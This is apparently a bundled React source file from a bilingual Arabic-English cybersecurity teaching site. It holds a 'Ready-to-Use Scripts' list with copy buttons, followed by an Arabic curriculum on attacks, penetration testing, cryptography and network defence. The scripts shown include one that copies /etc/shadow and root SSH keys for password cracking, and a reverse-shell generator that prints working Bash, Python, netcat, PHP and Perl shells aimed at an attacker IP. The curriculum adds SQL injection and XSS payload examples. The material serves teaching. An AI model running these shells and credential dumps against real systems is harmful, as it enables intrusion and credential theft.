if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script must be run as root"
    exit 1
fi

OUTPUT_DIR="./extracted_hashes"
mkdir -p $OUTPUT_DIR

echo ""
echo "[*] Extracting password information..."

# Extract /etc/passwd
if [ -f /etc/passwd ]; then
    cp /etc/passwd $OUTPUT_DIR/passwd.txt
    echo "[+] Copied /etc/passwd"
fi

# Extract /etc/shadow
if [ -f /etc/shadow ]; then
    cp /etc/shadow $OUTPUT_DIR/shadow.txt
    echo "[+] Copied /etc/shadow"
fi

# Create unshadow file for John
if [ -f $OUTPUT_DIR/passwd.txt ] && [ -f $OUTPUT_DIR/shadow.txt ]; then
    unshadow $OUTPUT_DIR/passwd.txt $OUTPUT_DIR/shadow.txt > $OUTPUT_DIR/unshadowed.txt 2>/dev/null
    echo "[+] Created unshadowed file"
fi

# Extract SSH keys
if [ -d /root/.ssh ]; then
    cp -r /root/.ssh $OUTPUT_DIR/root_ssh 2>/dev/null
    echo "[+] Copied root SSH keys"
fi

echo ""
echo "[*] Extraction complete. Files saved to: $OUTPUT_DIR"`,
        },
        {
            name: { ar: "Reverse Shell", en: "Reverse Shell" },
            description: { ar: "اتصال عكسي للتحكم عن بعد", en: "Reverse connection for remote control" },
            language: "Bash",
            code: `#!/bin/bash

# WARNING: Educational purposes only!
# Only use in authorized penetration testing.

echo "========================================="
echo "       REVERSE SHELL GENERATOR           "
echo "========================================="

echo ""
read -p "Enter your IP address: " LHOST
read -p "Enter your listening port: " LPORT

echo ""
echo "[*] Reverse Shell One-Liners:"
echo ""

echo "=== Bash ===" 
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo ""

echo "=== Python ==="
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"
echo ""

echo "=== Netcat ==="
echo "nc -e /bin/sh $LHOST $LPORT"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
echo ""

echo "=== PHP ==="
echo "php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'"
echo ""

echo "=== Perl ==="
echo "perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"
echo ""

echo "[*] Start listener with: nc -lvnp $LPORT"`,
        },
    ],
    xk = () => {
        const [e, t] = x.useState(null),
            [n, r] = x.useState("all"),
            [o, i] = x.useState("ar"),
            s = (d, p) => {
                navigator.clipboard.writeText(d), t(p), setTimeout(() => t(null), 2e3);
            },
            a = n === "all" ? gs : gs.filter((d) => d.language === n),
            c = (d) => {
                switch (d) {
                    case "Python":
                        return "bg-blue-500/20 text-blue-400 border-blue-500/30";
                    case "C++":
                        return "bg-purple-500/20 text-purple-400 border-purple-500/30";
                    case "Bash":
                        return "bg-green-500/20 text-green-400 border-green-500/30";
                    default:
                        return "bg-primary/20 text-primary border-primary/30";
                }
            },
            u = {
                title: o === "ar" ? "السكربتات الجاهزة" : "Ready-to-Use Scripts",
                subtitle:
                    o === "ar"
                        ? `${gs.length} سكربت بلغات Python و C++ و Bash`
                        : `${gs.length} scripts in Python, C++, and Bash`,
                all: o === "ar" ? "الكل" : "All",
            };
        return l.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                l.jsx(Or, {}),
                l.jsx("main", {
                    className: "pt-24 pb-16",
                    children: l.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            l.jsxs("div", {
                                className: "text-center mb-12",
                                children: [
                                    l.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: l.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: l.jsx(Vu, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    l.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mb-4",
                                        children: [
                                            l.jsx("h1", {
                                                className: "text-4xl md:text-5xl font-bold text-primary text-glow",
                                                children: u.title,
                                            }),
                                            l.jsx("button", {
                                                onClick: () => i((d) => (d === "ar" ? "en" : "ar")),
                                                className:
                                                    "p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors",
                                                children: l.jsx(zi, { className: "w-5 h-5 text-muted-foreground" }),
                                            }),
                                        ],
                                    }),
                                    l.jsx("p", {
                                        className: "text-muted-foreground text-lg max-w-2xl mx-auto",
                                        children: u.subtitle,
                                    }),
                                ],
                            }),
                            l.jsx("div", {
                                className: "flex justify-center gap-3 mb-10 flex-wrap",
                                children: ["all", "Python", "C++", "Bash"].map((d) =>
                                    l.jsx(
                                        "button",
                                        {
                                            onClick: () => r(d),
                                            className: `px-6 py-2 rounded-xl transition-all ${n === d ? "bg-primary/20 text-primary border border-primary/50" : "bg-secondary text-muted-foreground border border-border/50 hover:border-primary/30"}`,
                                            children: d === "all" ? u.all : d,
                                        },
                                        d
                                    )
                                ),
                            }),
                            l.jsx("div", {
                                className: "max-w-4xl mx-auto space-y-6",
                                children: a.map((d, p) =>
                                    l.jsxs(
                                        "div",
                                        {
                                            className: "cyber-card overflow-hidden",
                                            children: [
                                                l.jsx("div", {
                                                    className: "p-6 border-b border-border/30",
                                                    children: l.jsxs("div", {
                                                        className: "flex items-center justify-between",
                                                        children: [
                                                            l.jsxs("div", {
                                                                children: [
                                                                    l.jsx("h3", {
                                                                        className:
                                                                            "text-xl font-bold text-primary mb-1",
                                                                        children: o === "ar" ? d.name.ar : d.name.en,
                                                                    }),
                                                                    l.jsx("p", {
                                                                        className: "text-muted-foreground text-sm",
                                                                        children:
                                                                            o === "ar"
                                                                                ? d.description.ar
                                                                                : d.description.en,
                                                                    }),
                                                                ],
                                                            }),
                                                            l.jsx("span", {
                                                                className: `px-3 py-1 rounded-lg text-sm font-medium border ${c(d.language)}`,
                                                                children: d.language,
                                                            }),
                                                        ],
                                                    }),
                                                }),
                                                l.jsxs("div", {
                                                    className: "relative",
                                                    children: [
                                                        l.jsx("button", {
                                                            onClick: () => s(d.code, p),
                                                            className:
                                                                "absolute top-4 left-4 p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-all z-10",
                                                            children:
                                                                e === p
                                                                    ? l.jsx($u, { className: "w-4 h-4 text-primary" })
                                                                    : l.jsx(Da, {
                                                                          className: "w-4 h-4 text-muted-foreground",
                                                                      }),
                                                        }),
                                                        l.jsx("pre", {
                                                            className:
                                                                "p-6 pt-14 overflow-x-auto bg-background/50 text-sm",
                                                            children: l.jsx("code", {
                                                                className: "text-foreground font-mono",
                                                                dir: "ltr",
                                                                children: d.code,
                                                            }),
                                                        }),
                                                    ],
                                                }),
                                            ],
                                        },
                                        p
                                    )
                                ),
                            }),
                        ],
                    }),
                }),
                l.jsx(_r, {}),
            ],
        });
    },
    ys = [
        {
            icon: Tr,
            title: "أساسيات الأمن السيبراني",
            description: "تعرف على المفاهيم الأساسية والمبادئ الثلاثة للأمن السيبراني",
            subTopics: [
                {
                    title: "ما هو الأمن السيبراني؟",
                    content: [
                        "الأمن السيبراني هو مجموعة من التقنيات والممارسات المصممة لحماية الأنظمة والشبكات والبيانات من الهجمات الإلكترونية",
                        "يشمل حماية الأجهزة (Hardware) والبرمجيات (Software) والبيانات من الوصول غير المصرح به",
                        "الهدف الرئيسي هو ضمان سرية وسلامة وتوافر المعلومات (CIA Triad)",
                        "يتضمن عدة مجالات: أمن الشبكات، أمن التطبيقات، أمن المعلومات، التعافي من الكوارث",
                        "أصبح الأمن السيبراني ضرورة ملحة مع تزايد الاعتماد على التكنولوجيا في جميع جوانب الحياة",
                        "يُقدر حجم سوق الأمن السيبراني بأكثر من 200 مليار دولار عالمياً",
                        "الطلب على متخصصي الأمن السيبراني يتزايد بشكل كبير مع نقص حاد في الكوادر المؤهلة",
                    ],
                },
                {
                    title: "مثلث CIA - السرية والنزاهة والتوافر",
                    content: [
                        "السرية (Confidentiality): ضمان وصول المعلومات للأشخاص المصرح لهم فقط باستخدام التشفير والتحكم في الوصول",
                        "النزاهة (Integrity): ضمان عدم تعديل البيانات بشكل غير مصرح به، باستخدام checksums وdigital signatures",
                        "التوافر (Availability): ضمان توفر المعلومات والخدمات عند الحاجة إليها مع حماية من هجمات DDoS",
                        "هذه المبادئ الثلاثة تشكل أساس أي استراتيجية أمنية ناجحة",
                        "التوازن بين هذه المبادئ مهم - زيادة الأمان قد تؤثر على سهولة الاستخدام",
                        "AAA Model: Authentication (التحقق من الهوية)، Authorization (التفويض)، Accounting (المحاسبة)",
                        "مبدأ أقل الصلاحيات (Least Privilege): منح المستخدمين الحد الأدنى من الصلاحيات اللازمة",
                        "الفصل بين الواجبات (Separation of Duties): توزيع المهام الحساسة على أكثر من شخص",
                    ],
                },
                {
                    title: "أنواع التهديدات السيبرانية",
                    content: [
                        "البرمجيات الخبيثة (Malware): فيروسات، ديدان، تروجان، رانسوموير، سبايوير، أدوير، روتكيت",
                        "هجمات التصيد (Phishing): رسائل مزيفة لخداع المستخدمين وسرقة بياناتهم",
                        "هجمات الهندسة الاجتماعية: استغلال العامل البشري للوصول للمعلومات",
                        "هجمات حجب الخدمة (DDoS): إغراق الخوادم بطلبات وهمية لتعطيلها",
                        "التهديدات الداخلية: موظفون ساخطون أو مهملون يشكلون خطراً على المؤسسة",
                        "التهديدات المتقدمة المستمرة (APT): هجمات معقدة تستهدف مؤسسات محددة لفترات طويلة",
                        "هجمات سلسلة التوريد (Supply Chain Attacks): استهداف موردي البرمجيات للوصول لعملائهم",
                        "Cryptojacking: استخدام موارد الضحية لتعدين العملات الرقمية بدون إذن",
                        "Formjacking: سرقة بيانات بطاقات الدفع من نماذج الويب",
                        "Zero-Day Exploits: استغلال ثغرات غير معروفة قبل إصدار تصحيح لها",
                    ],
                },
                {
                    title: "طبقات الحماية (Defense in Depth)",
                    content: [
                        "الطبقة الفيزيائية: حماية الأجهزة والمراكز من الوصول غير المصرح به، كاميرات مراقبة، أقفال بيومترية",
                        "طبقة الشبكة: جدران حماية، IDS/IPS، تجزئة الشبكة، VPN، Network Access Control",
                        "طبقة التطبيقات: فحص المدخلات، إدارة الجلسات، التحقق من الصلاحيات، WAF",
                        "طبقة البيانات: التشفير، النسخ الاحتياطي، التحكم في الوصول، DLP",
                        "طبقة المستخدم: التوعية الأمنية، المصادقة الثنائية، سياسات كلمات المرور",
                        "الفكرة: إذا فشلت طبقة واحدة، تبقى طبقات أخرى للحماية",
                        "طبقة المراقبة: SIEM، تحليل السجلات، مراقبة الشبكة على مدار الساعة",
                        "خطة الاستجابة للحوادث: إجراءات محددة للتعامل مع الاختراقات",
                    ],
                },
                {
                    title: "إدارة المخاطر الأمنية",
                    content: [
                        "تحديد الأصول (Asset Identification): معرفة ما تريد حمايته وتصنيفه حسب الأهمية",
                        "تحليل التهديدات (Threat Analysis): تحديد التهديدات المحتملة ومصادرها",
                        "تقييم الثغرات (Vulnerability Assessment): فحص نقاط الضعف في الأنظمة",
                        "حساب المخاطر: Risk = Threat × Vulnerability × Impact",
                        "معالجة المخاطر: Accept (قبول)، Mitigate (تخفيف)، Transfer (نقل)، Avoid (تجنب)",
                        "المراقبة المستمرة: متابعة التهديدات الجديدة وتحديث الإجراءات",
                        "Business Impact Analysis (BIA): تحليل تأثير الحوادث على الأعمال",
                        "Risk Register: سجل لتوثيق وتتبع المخاطر المحددة",
                    ],
                },
            ],
        },
        {
            icon: wg,
            title: "أنواع الهجمات الإلكترونية",
            description: "تعلم أشهر أنواع الهجمات وكيفية عملها للحماية منها",
            subTopics: [
                {
                    title: "هجمات التصيد (Phishing)",
                    content: [
                        "Spear Phishing: تصيد موجه لشخص أو منظمة محددة مع معلومات مخصصة",
                        "Whaling: استهداف المدراء التنفيذيين والشخصيات المهمة (C-Level)",
                        "Clone Phishing: نسخ رسائل شرعية وتعديلها مع روابط خبيثة",
                        "Vishing: التصيد عبر المكالمات الهاتفية وانتحال هوية البنوك أو الشركات",
                        "Smishing: التصيد عبر رسائل SMS مع روابط ضارة",
                        "Business Email Compromise (BEC): انتحال هوية المدراء لطلب تحويلات مالية",
                        "Angler Phishing: التصيد عبر حسابات خدمة عملاء وهمية على مواقع التواصل",
                        "طرق الكشف: التحقق من عنوان المرسل، الروابط المشبوهة، الأخطاء الإملائية، الإلحاح غير المبرر",
                        "أدوات مساعدة: PhishTank، VirusTotal، URL2PNG للتحقق من الروابط",
                    ],
                },
                {
                    title: "هجمات حقن SQL (SQL Injection)",
                    content: [
                        "تعريف: إدخال أوامر SQL خبيثة عبر حقول الإدخال في التطبيقات",
                        "In-band SQLi: استخدام نفس القناة للهجوم واستخراج البيانات (UNION-based, Error-based)",
                        "Blind SQLi: لا تظهر النتائج مباشرة، يتم الاستدلال من سلوك التطبيق (Boolean-based, Time-based)",
                        "Out-of-band SQLi: إرسال البيانات لخادم خارجي يتحكم به المهاجم",
                        "Second-Order SQLi: حقن يتم تخزينه وتنفيذه لاحقاً",
                        "مثال بسيط: ' OR '1'='1 - يجعل الشرط صحيحاً دائماً",
                        "مثال متقدم: ' UNION SELECT username, password FROM users--",
                        "الحماية: استخدام Prepared Statements، التحقق من المدخلات، مبدأ أقل الصلاحيات",
                        "أدوات الاختبار: SQLMap، Havij، BBQSQL",
                        "استخراج قواعد البيانات: INFORMATION_SCHEMA للحصول على هيكل قاعدة البيانات",
                    ],
                },
                {
                    title: "هجمات XSS (Cross-Site Scripting)",
                    content: [
                        "Stored XSS: تخزين الكود الخبيث في قاعدة البيانات وتنفيذه لكل زائر (أخطر نوع)",
                        "Reflected XSS: الكود في URL ويتم تنفيذه فور فتح الرابط",
                        "DOM-based XSS: تعديل DOM مباشرة دون مرور بالخادم",
                        "Mutation XSS (mXSS): استغلال طريقة تحليل المتصفح للـ HTML",
                        "الخطورة: سرقة الجلسات (Session Hijacking)، تغيير المحتوى، نشر البرمجيات الخبيثة",
                        "Cookie Stealing: document.cookie وإرساله لخادم المهاجم",
                        "Keylogging: تسجيل ضغطات المفاتيح عبر JavaScript",
                        "الحماية: ترميز المخرجات (Output Encoding)، Content Security Policy، HTTP-Only Cookies",
                        "أمثلة: <script>alert('XSS')</script> أو <img src=x onerror=alert('XSS')>",
                        "أدوات الاختبار: XSStrike، Dalfox، XSSer",
                    ],
                },
                {
                    title: "هجمات القوة الغاشمة (Brute Force)",
                    content: [
                        "Simple Brute Force: تجربة جميع الاحتمالات الممكنة بشكل منهجي",
                        "Dictionary Attack: استخدام قائمة كلمات شائعة ومعدلة (rockyou.txt, SecLists)",
                        "Hybrid Attack: دمج الطريقتين مع إضافة أرقام ورموز",
                        "Credential Stuffing: استخدام بيانات مسربة من اختراقات سابقة",
                        "Password Spraying: تجربة كلمة مرور شائعة على حسابات متعددة",
                        "Reverse Brute Force: تجربة اسم مستخدم مع كلمة مرور ثابتة",
                        "الحماية: كلمات مرور قوية، تأخير بعد المحاولات الفاشلة، CAPTCHA، المصادقة الثنائية",
                        "Account Lockout Policy: قفل الحساب بعد عدد معين من المحاولات",
                        "أدوات شائعة: Hydra, John the Ripper, Hashcat, Medusa, Burp Intruder",
                        "قواعد كلمات المرور: Hashcat rules، John Jumbo rules لتوليد تحويلات",
                    ],
                },
                {
                    title: "هجمات Man-in-the-Middle (MITM)",
                    content: [
                        "ARP Spoofing/Poisoning: تزييف جداول ARP لاعتراض الاتصالات في الشبكة المحلية",
                        "DNS Spoofing/Cache Poisoning: تزييف سجلات DNS لتوجيه المستخدمين لمواقع مزيفة",
                        "SSL Stripping: تحويل اتصال HTTPS لـ HTTP غير مشفر (أداة: sslstrip)",
                        "HTTPS Spoofing: إنشاء شهادات مزيفة لاعتراض الاتصالات المشفرة",
                        "Evil Twin: إنشاء نقطة وصول Wi-Fi مزيفة بنفس اسم شبكة شرعية",
                        "Session Hijacking: سرقة جلسة مستخدم نشطة",
                        "IP Spoofing: تزوير عنوان IP المصدر",
                        "الخطورة: سرقة بيانات الدخول، حقن محتوى خبيث، التجسس على الاتصالات",
                        "الحماية: استخدام HTTPS، HSTS، VPN، عدم الاتصال بشبكات عامة غير موثوقة",
                        "أدوات: Ettercap، Bettercap، Wireshark، mitmproxy",
                    ],
                },
                {
                    title: "هجمات حجب الخدمة (DoS/DDoS)",
                    content: [
                        "DoS: هجوم من مصدر واحد لاستنزاف موارد الهدف",
                        "DDoS: هجوم موزع من مصادر متعددة (Botnets)",
                        "Volumetric Attacks: إغراق عرض النطاق (UDP Flood, ICMP Flood, DNS Amplification)",
                        "Protocol Attacks: استنزاف موارد الخادم (SYN Flood, Ping of Death, Smurf Attack)",
                        "Application Layer Attacks: استهداف الطبقة السابعة (HTTP Flood, Slowloris)",
                        "DNS Amplification: استغلال خوادم DNS لتضخيم الهجوم حتى 70x",
                        "NTP Amplification: استغلال خوادم NTP للتضخيم",
                        "Memcached Amplification: تضخيم يصل لـ 51,000x",
                        "الحماية: CDN، Anycast، Rate Limiting، Cloud-based DDoS Protection",
                        "أدوات الحماية: Cloudflare، Akamai، AWS Shield",
                    ],
                },
                {
                    title: "هجمات الهندسة الاجتماعية",
                    content: [
                        "Pretexting: إنشاء سيناريو مزيف للحصول على معلومات (ادعاء أنك من الدعم الفني)",
                        "Baiting: ترك أجهزة USB مصابة في أماكن عامة",
                        "Quid Pro Quo: تقديم خدمة مقابل معلومات",
                        "Tailgating/Piggybacking: الدخول خلف شخص مصرح له بدون تصريح",
                        "Shoulder Surfing: مراقبة شخص يدخل كلمة مروره",
                        "Dumpster Diving: البحث في القمامة عن معلومات مفيدة",
                        "Watering Hole: إصابة مواقع يزورها الضحايا المستهدفون",
                        "Impersonation: انتحال شخصية موظف أو مسؤول",
                        "الحماية: التدريب والتوعية، التحقق من الهوية، سياسات أمنية صارمة",
                        "Social Engineering Toolkit (SET): أداة أتمتة هجمات الهندسة الاجتماعية",
                    ],
                },
            ],
        },
        {
            icon: aa,
            title: "اختبار الاختراق (Penetration Testing)",
            description: "تعرف على مراحل اختبار الاختراق الاحترافي والمنهجيات المعتمدة",
            subTopics: [
                {
                    title: "مراحل اختبار الاختراق",
                    content: [
                        "1. التخطيط والاستطلاع: تحديد النطاق، جمع المعلومات السلبي والنشط، توقيع العقود",
                        "2. المسح (Scanning): فحص المنافذ، اكتشاف الخدمات، تحديد نقاط الضعف، OS Fingerprinting",
                        "3. الوصول (Gaining Access): استغلال الثغرات المكتشفة للحصول على وصول أولي",
                        "4. الحفاظ على الوصول: تثبيت backdoors، رفع الصلاحيات (Privilege Escalation)",
                        "5. الحركة الجانبية (Lateral Movement): التنقل بين الأنظمة داخل الشبكة",
                        "6. استخراج البيانات (Exfiltration): سرقة البيانات الحساسة كإثبات",
                        "7. التغطية: إزالة الآثار وتنظيف السجلات (في الهجمات الحقيقية)",
                        "8. التقرير: توثيق جميع الثغرات مع توصيات الإصلاح ودرجة الخطورة (CVSS)",
                        "9. إعادة الاختبار: التحقق من إصلاح الثغرات بعد المعالجة",
                    ],
                },
                {
                    title: "أنواع اختبار الاختراق",
                    content: [
                        "Black Box: لا معلومات مسبقة - يحاكي هجوم خارجي حقيقي",
                        "White Box: معلومات كاملة عن الهدف - فحص شامل للكود والبنية (Code Review)",
                        "Gray Box: معلومات جزئية - يحاكي مهاجم داخلي أو شريك",
                        "Internal Testing: اختبار من داخل الشبكة كموظف (Insider Threat)",
                        "External Testing: اختبار من خارج الشبكة كمهاجم خارجي",
                        "Blind Testing: المختبر لا يعرف شيئاً والهدف لا يعرف بالاختبار",
                        "Double Blind: لا أحد يعرف بالاختبار سوى الإدارة العليا",
                        "Social Engineering Testing: اختبار مقاومة الموظفين للتصيد والخداع",
                        "Physical Penetration Testing: اختبار الأمن الفيزيائي للمباني",
                        "Wireless Penetration Testing: اختبار أمن الشبكات اللاسلكية",
                    ],
                },
                {
                    title: "منهجيات اختبار الاختراق",
                    content: [
                        "OWASP Testing Guide (OTG): دليل شامل لاختبار تطبيقات الويب - أكثر من 90 حالة اختبار",
                        "PTES (Penetration Testing Execution Standard): معيار شامل لاختبار الاختراق",
                        "OSSTMM (Open Source Security Testing Methodology Manual): منهجية مفتوحة المصدر علمية",
                        "NIST SP 800-115: إرشادات المعهد الوطني للمعايير والتكنولوجيا",
                        "ISSAF (Information Systems Security Assessment Framework): إطار تقييم شامل",
                        "CREST: معيار بريطاني معتمد لاختبار الاختراق",
                        "PCI DSS Penetration Testing: متطلبات اختبار بطاقات الدفع",
                        "Cyber Kill Chain: نموذج Lockheed Martin لفهم مراحل الهجوم",
                        "MITRE ATT&CK Framework: قاعدة معرفية لتكتيكات وتقنيات المهاجمين",
                        "اختيار المنهجية يعتمد على نوع الهدف ومتطلبات العميل والمعايير المطلوبة",
                    ],
                },
                {
                    title: "الاستطلاع وجمع المعلومات",
                    content: [
                        "Passive Reconnaissance: جمع معلومات بدون التفاعل مع الهدف (OSINT)",
                        "Google Dorks: استخدام محركات البحث للعثور على معلومات حساسة (site:, filetype:, inurl:)",
                        "Shodan/Censys: محركات بحث للأجهزة المتصلة بالإنترنت",
                        "WHOIS/DNS Records: معلومات تسجيل النطاقات وسجلات DNS",
                        "Wayback Machine: أرشيف الإنترنت لمشاهدة إصدارات قديمة من المواقع",
                        "theHarvester: جمع البريد الإلكتروني والنطاقات الفرعية",
                        "Maltego: أداة تحليل الروابط وتصور العلاقات",
                        "Active Reconnaissance: فحص مباشر للهدف قد يتم اكتشافه",
                        "Nmap: فحص المنافذ والخدمات ونظام التشغيل",
                        "تذكر: الاستطلاع الجيد هو 80% من نجاح اختبار الاختراق",
                    ],
                },
                {
                    title: "استغلال الثغرات (Exploitation)",
                    content: [
                        "Metasploit Framework: أشهر إطار عمل للاستغلال مع آلاف الـ exploits",
                        "Exploit-DB: قاعدة بيانات استغلالات عامة مع أكواد جاهزة",
                        "CVE Database: قاعدة بيانات الثغرات المعروفة",
                        "Zero-Day Exploits: استغلالات لثغرات غير معروفة - الأكثر قيمة",
                        "Buffer Overflow: استغلال أخطاء إدارة الذاكرة لتنفيذ كود",
                        "Shellcode: كود صغير يتم تنفيذه بعد نجاح الاستغلال (reverse shell, bind shell)",
                        "Payload Generation: msfvenom لإنشاء payloads مخصصة",
                        "Post-Exploitation: جمع المعلومات بعد الوصول، رفع الصلاحيات",
                        "Pivoting: استخدام الجهاز المخترق للوصول لأجهزة أخرى",
                        "Persistence: تثبيت وصول دائم للعودة لاحقاً",
                    ],
                },
            ],
        },
        {
            icon: Rc,
            title: "التشفير والحماية",
            description: "أساسيات التشفير وأنواعه وكيفية استخدامه لحماية البيانات",
            subTopics: [
                {
                    title: "أنواع التشفير",
                    content: [
                        "التشفير المتماثل (Symmetric): مفتاح واحد للتشفير وفك التشفير - سريع",
                        "خوارزميات: AES (الأكثر استخداماً - 128/192/256 bit)، DES (قديم وضعيف)، 3DES، Blowfish، Twofish، ChaCha20",
                        "التشفير غير المتماثل (Asymmetric): مفتاح عام للتشفير وخاص لفك التشفير - بطيء لكن آمن",
                        "خوارزميات: RSA (2048+ bit)، ECC (أسرع وأقوى)، DSA، ElGamal، Ed25519",
                        "التشفير المختلط: استخدام كلا النوعين معاً (مثل TLS) - يجمع السرعة والأمان",
                        "المفتاح العام يمكن مشاركته، المفتاح الخاص يجب حمايته بشكل مطلق",
                        "Key Exchange: Diffie-Hellman لتبادل المفاتيح بشكل آمن",
                        "Elliptic Curve Cryptography (ECC): نفس الأمان بمفاتيح أصغر (256-bit ECC ≈ 3072-bit RSA)",
                        "Post-Quantum Cryptography: خوارزميات مقاومة للحوسبة الكمومية (Lattice-based)",
                    ],
                },
                {
                    title: "دوال الهاش (Hashing)",
                    content: [
                        "تعريف: تحويل أي بيانات لقيمة ثابتة الطول (بصمة رقمية فريدة)",
                        "خصائص: أحادية الاتجاه، تغيير بسيط ينتج هاش مختلف تماماً (Avalanche Effect)",
                        "MD5: 128-bit، سريع لكن ضعيف (collisions معروفة) - لا يستخدم للأمان",
                        "SHA-1: 160-bit، أفضل من MD5 لكن أصبح ضعيفاً أيضاً (2017 collision)",
                        "SHA-256/384/512: آمن ومستخدم حالياً في معظم التطبيقات",
                        "SHA-3 (Keccak): تصميم مختلف تماماً كبديل لـ SHA-2",
                        "bcrypt: مصممة لكلمات المرور مع salt وcost factor قابل للتعديل",
                        "Argon2: الفائز في Password Hashing Competition - الأفضل حالياً",
                        "HMAC: Hash-based Message Authentication Code للتحقق من سلامة الرسائل",
                        "استخدامات: تخزين كلمات المرور، التحقق من سلامة الملفات، التوقيع الرقمي",
                    ],
                },
                {
                    title: "البروتوكولات الآمنة",
                    content: [
                        "TLS 1.3: أحدث إصدار - أسرع وأكثر أماناً (إزالة خوارزميات ضعيفة)",
                        "SSL/TLS: تأمين اتصالات الويب (HTTPS) ومعظم البروتوكولات",
                        "SSH: Secure Shell للوصول الآمن للخوادم ونقل الملفات (Port 22)",
                        "SFTP/SCP: نقل ملفات آمن عبر SSH",
                        "IPsec: تأمين اتصالات الشبكة على مستوى IP (VPN - Transport/Tunnel mode)",
                        "WPA3: أحدث معيار لتأمين شبكات Wi-Fi (SAE - Dragonfly)",
                        "PGP/GPG: تشفير البريد الإلكتروني والملفات (Web of Trust)",
                        "S/MIME: تشفير البريد الإلكتروني المؤسسي (Certificate-based)",
                        "DNSSEC: تأمين استعلامات DNS من التزوير",
                        "HTTPS Everywhere: فرض استخدام HTTPS على جميع المواقع",
                    ],
                },
                {
                    title: "إدارة المفاتيح والشهادات",
                    content: [
                        "الشهادات الرقمية X.509: إثبات هوية المواقع والخدمات",
                        "Certificate Authority (CA): جهة موثوقة تصدر الشهادات (DigiCert, Let's Encrypt)",
                        "Root CA → Intermediate CA → End Entity Certificate (Chain of Trust)",
                        "PKI (Public Key Infrastructure): بنية تحتية متكاملة لإدارة المفاتيح",
                        "Certificate Revocation: CRL و OCSP لإلغاء الشهادات المخترقة",
                        "Key Management: توليد، تخزين، توزيع، تدوير، إلغاء المفاتيح",
                        "Hardware Security Modules (HSM): أجهزة متخصصة لحماية المفاتيح",
                        "Key Escrow: تخزين نسخة احتياطية من المفاتيح لدى طرف ثالث",
                        "Perfect Forward Secrecy (PFS): حماية الاتصالات السابقة حتى لو سُرق المفتاح",
                        "Certificate Pinning: ربط التطبيق بشهادة معينة لمنع MITM",
                    ],
                },
                {
                    title: "تشفير البيانات",
                    content: [
                        "Encryption at Rest: تشفير البيانات المخزنة (BitLocker, LUKS, FileVault)",
                        "Encryption in Transit: تشفير البيانات أثناء النقل (TLS, VPN)",
                        "End-to-End Encryption (E2EE): التشفير من المرسل للمستقبل فقط (Signal, WhatsApp)",
                        "Full Disk Encryption (FDE): تشفير القرص الصلب بالكامل",
                        "File-Level Encryption: تشفير ملفات محددة",
                        "Database Encryption: TDE (Transparent Data Encryption)",
                        "Column-Level Encryption: تشفير أعمدة محددة في قاعدة البيانات",
                        "Tokenization: استبدال البيانات الحساسة برموز (بطاقات الائتمان)",
                        "Data Masking: إخفاء جزء من البيانات (XXX-XXX-1234)",
                        "Secure Key Storage: استخدام Vault أو HSM لتخزين المفاتيح",
                    ],
                },
            ],
        },
        {
            icon: Jr,
            title: "أمن الشبكات",
            description: "حماية الشبكات من التهديدات وأدوات المراقبة والحماية",
            subTopics: [
                {
                    title: "جدران الحماية (Firewalls)",
                    content: [
                        "Packet Filtering: فلترة حسب IP والمنافذ والبروتوكولات (Layer 3-4)",
                        "Stateful Inspection: تتبع حالة الاتصالات وفحص السياق",
                        "Application Layer Firewall: فحص محتوى التطبيقات (Layer 7)",
                        "Next-Generation Firewall (NGFW): دمج IPS وDPI ومكافحة البرمجيات الخبيثة وSSL inspection",
                        "Web Application Firewall (WAF): حماية تطبيقات الويب من SQLi وXSS (ModSecurity, Cloudflare)",
                        "Cloud Firewall: جدران حماية سحابية (AWS Security Groups, Azure NSG)",
                        "القواعد: Allow/Deny بناءً على المصدر والوجهة والمنفذ والبروتوكول",
                        "Default Deny: رفض كل شيء ثم السماح بما هو مطلوب فقط",
                        "Firewall Evasion: تقنيات تجاوز جدران الحماية (Fragmentation, Tunneling)",
                        "أدوات: iptables, nftables, pfSense, Palo Alto, Fortinet",
                    ],
                },
                {
                    title: "أنظمة كشف ومنع التسلل",
                    content: [
                        "IDS (Intrusion Detection System): اكتشاف الأنشطة المشبوهة والتنبيه فقط",
                        "IPS (Intrusion Prevention System): اكتشاف ومنع الهجمات تلقائياً",
                        "Signature-based: مقارنة مع أنماط هجمات معروفة (سريع، يفوت Zero-Day)",
                        "Anomaly-based: اكتشاف السلوك غير الطبيعي مقارنة بالخط الأساسي (يكتشف الجديد، false positives)",
                        "Heuristic-based: تحليل سلوكي للكشف عن البرمجيات الخبيثة",
                        "Network-based (NIDS/NIPS): مراقبة حركة الشبكة (Snort, Suricata, Zeek)",
                        "Host-based (HIDS/HIPS): مراقبة نظام تشغيل واحد (OSSEC, Wazuh)",
                        "Hybrid IDS: دمج أنواع متعددة للحصول على تغطية أفضل",
                        "SIEM Integration: دمج مع أنظمة إدارة الأحداث الأمنية",
                        "Tuning: ضبط القواعد لتقليل False Positives/Negatives",
                    ],
                },
                {
                    title: "تجزئة الشبكة (Network Segmentation)",
                    content: [
                        "VLANs: شبكات محلية افتراضية لفصل حركة المرور (Layer 2)",
                        "Subnetting: تقسيم الشبكة لشبكات فرعية (Layer 3)",
                        "DMZ: منطقة منزوعة السلاح للخوادم العامة (Web, Mail, DNS)",
                        "Air Gap: فصل كامل عن الإنترنت للأنظمة الحساسة (SCADA, Military)",
